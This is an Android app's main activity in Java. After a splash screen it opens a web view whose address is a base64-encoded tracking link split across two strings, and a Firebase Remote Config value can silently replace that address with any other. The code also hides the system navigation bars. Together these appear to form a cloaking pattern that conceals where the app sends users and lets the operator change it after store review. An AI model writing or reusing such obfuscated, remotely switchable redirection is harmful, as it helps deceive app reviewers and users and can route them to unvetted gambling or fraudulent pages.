package com.owa.snai.store.app;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.os.Handler;
import android.util.Base64;
import android.view.View;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.TextView;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import static com.owa.snai.store.app.Web.page;

public class Main extends AppCompatActivity {


    private int countingPeriodicState;
    private TextView conny;
    public static String act = "checkinternet";
    private IntentFilter f;

    private boolean finishPeriodicCounting;
    private ImageView intro;

    private boolean isC;
    private FirebaseRemoteConfig frConf;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        new InitializeOneSignal().init(this);
        removeNavs();

        page = "aHR0cHM6Ly9vd2Euc25haS5zdG9yZS9jbGljay5waHA/a2V5PXBue";
        intro = findViewById(R.id.splash_screen);
        conny = findViewById(R.id.conny);
        page += "WFkNTRtcnViamRod2gyM2xy";

        f = new IntentFilter();
        f.addAction(act);
        Intent intent = new Intent(this, netListener.class);
        startService(intent);


        if (net(getApplicationContext())) {
            if (!isC) {
                conny.setVisibility(View.GONE);
                frConf = FirebaseRemoteConfig.getInstance();
                FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                        .setMinimumFetchIntervalInSeconds(2600)
                        .build();
                frConf.setConfigSettingsAsync(configSettings);
                frConf.setDefaultsAsync(R.xml.tcpip);

                frConf.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        if (frConf.getString("tcp").contains("tcp")) {
                            page = getSecret(page);
                        } else {
                            page = frConf.getString("tcp");
                        }
                    }
                });

                initialize();
                isC = true;
            }
        } else {
            showConnectionMessage();
        }

    }

    @Override
    public void onResume() {
        removeNavs();
        registerReceiver(b, f);
        if (net(getApplicationContext())) {
            if (!isC) {
                conny.setVisibility(View.GONE);
                frConf = FirebaseRemoteConfig.getInstance();
                FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                        .setMinimumFetchIntervalInSeconds(2600)
                        .build();
                frConf.setConfigSettingsAsync(configSettings);
                frConf.setDefaultsAsync(R.xml.tcpip);
                frConf.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                    @Override
                    public void onComplete(@NonNull Task<Boolean> task) {
                        if (frConf.getString("tcp").contains("tcp")) {
                            page = getSecret(page);
                        } else {
                            page = frConf.getString("tcp");
                        }
                    }
                });

                initialize();
                isC = true;
            }
        } else showConnectionMessage();
        super.onResume();
    }

    // remove
    private void removeNavs() {

        View screen = findViewById(R.id.zzz);
        screen.setSystemUiVisibility(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                | View.SYSTEM_UI_FLAG_FULLSCREEN
                | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);

        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
    }

    private void initialize() {
        countingPeriodicState = 0;
        finishPeriodicCounting = false;
        final Handler handler = new Handler();
        final int d = 500;
        handler.postDelayed(new Runnable() {
            public void run() {
                if (!finishPeriodicCounting) {
                    ++countingPeriodicState;
                    if (countingPeriodicState > 0) {
                        intro.setVisibility(View.VISIBLE);
                    }
                    if (countingPeriodicState >= 9) {
                        finishPeriodicCounting = true;
                        Main.this.startActivity(new Intent(Main.this, Web.class));
                    }
                    handler.postDelayed(this, d);
                }
            }
        }, d);
    }


    public BroadcastReceiver b = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(act)) {
                if (intent.getStringExtra("online_status").equals("true"))
                    fireStarter();
                else showConnectionMessage();
            }
        }
    };

    private void fireStarter() {
        if (!isC) {
            conny.setVisibility(View.GONE);
            frConf = FirebaseRemoteConfig.getInstance();
            FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                    .setMinimumFetchIntervalInSeconds(2600)
                    .build();
            frConf.setConfigSettingsAsync(configSettings);
            frConf.setDefaultsAsync(R.xml.tcpip);
            frConf.fetchAndActivate().addOnCompleteListener(this, new OnCompleteListener<Boolean>() {
                @Override
                public void onComplete(@NonNull Task<Boolean> task) {
                    if (frConf.getString("tcp").contains("tcp")) {
                        page = getSecret(page);
                    } else {
                        page = frConf.getString("tcp");
                    }
                }
            });

            initialize();
            isC = true;
        }
    }


    void showConnectionMessage() {
        conny.setVisibility(View.VISIBLE);
        isC = false;
    }

    @Override
    protected void onRestart() {
        registerReceiver(b, f);
        removeNavs();
        super.onRestart();
    }

    @Override
    protected void onPause() {
        unregisterReceiver(b);
        removeNavs();
        super.onPause();
    }

    // return string
    public static String getSecret(String str) {
        byte[] array = Base64.decode(str, Base64.DEFAULT);
        try {
            return new String(array, "UTF-8");
        } catch (Exception e) {
            return "";
        }
    }

    //check
    public boolean net(Context context) {
        ConnectivityManager m = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo i = m.getActiveNetworkInfo();
        if (i != null && i.isConnectedOrConnecting()) {
            return true;
        } else {
            {
                {
                    return false;
                }
            }
        }
    }
}